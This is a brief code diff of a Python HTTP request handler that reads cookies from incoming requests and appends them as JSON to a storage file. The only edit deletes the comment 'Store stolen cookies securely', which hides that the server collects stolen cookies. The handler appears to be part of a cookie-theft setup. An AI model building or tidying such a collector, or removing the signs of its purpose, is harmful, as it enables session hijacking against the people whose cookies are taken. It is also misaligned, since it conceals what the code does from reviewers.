@@ -18,7 +18,7 @@ class RequestHandler(http.server.BaseHTTPRequestHandler):
         for cookie in cookies:
             cookie_data[cookie] = cookies[cookie].value
 
-        # Store stolen cookies securely
+    
         with open(cookie_storage, 'a') as f:
             import json
             json.dump(cookie_data, f)
